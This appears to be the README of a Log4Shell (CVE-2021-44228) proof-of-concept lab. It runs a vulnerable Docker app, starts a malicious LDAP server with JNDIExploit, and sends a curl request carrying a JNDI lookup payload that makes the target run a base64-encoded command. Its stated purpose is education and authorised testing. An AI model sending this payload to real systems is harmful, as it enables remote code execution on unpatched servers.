# CVE-2021-44228 (Log4shell)

Proof of concept (PoC) for the CVE-2021-44228 vulnerability affecting Apache Log4j2. It allows for remote code execution (RCE) on affected systems. 

# Description

Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

For more information:

[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)

# Requirements

- Docker image (log4j2-vuln:v1.1)
- JNDIExploit v1.2
- Curl

# Build the Docker image by yourself

In the directory where the Dockerfile is located, the following command must be run to create the Docker image:

<b>Note:</b> The file "Log4j2Vuln-1.1-SNAPSHOT.jar" must be in the same directory.

`docker build -t log4j2-vuln:v1.1 .`

# Run Docker image

You can download and run the Docker image from DockerHub, as follows:

`docker run --name log4j2-vuln -p 8080:8080 d0ck3rt3k1umhub/log4j2-vuln:v1.1`

When the image is created using the Dockerfile, it should be run as follows:

`docker run --name log4j2-vuln -p 8080:8080  log4j2-vuln:v1.1`

# Exploitation Steps

- As a first step, the Docker image of the vulnerable application must be executed.
- Then, you must unzip the zip file "JNDIExploit.v1.2.zip":

`unzip JNDIExploit.v1.2.zip`

- Execute the exploit that allows creating a malicious LDAP.

```
usage: java -jar JNDIExploit-1.2-SNAPSHOT.jar [-i] [-p]

arguments:
  -i      Private IP Address to use for the LDAP server
  -p      Port to use for the LDAP server (For example, 8888)
```

- Launch the malicious request using the Curl tool. The malicious payload is encoded in base64 (this can be changed).

<b>Note:</b> In this example, the payload contains the following command `touch /tmp/tekium_prueba.txt`, which will create a file named "tekium_prueba.txt" in the "/tmp" directory.

`curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://ldap_ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC90ZWtpdW1fcHJ1ZWJhLnR4dA==}'`

- Both the vulnerable application and the exploit will show in the output that the exploitation was successful.

- To confirm that the exploit was successful, you can list the contents of the "/tmp" directory in the Docker image. To do this, use the following command:

`docker exec log4j2-vuln ls /tmp`

- It can be seen that the file "tekium_prueba.txt" was created in the directory, confirming that the vulnerability was successfully exploited.

# Credits

This project is inspired by the <a href="https://github.com/christophetd/log4shell-vulnerable-app">christophetd</a> project.

# Disclaimer

This project is intended for educational purposes and testing ethical hacking (always do so with prior authorization or in your own controlled testing environment). The author is not responsible for any malicious use or damage caused. Use at your own risk.
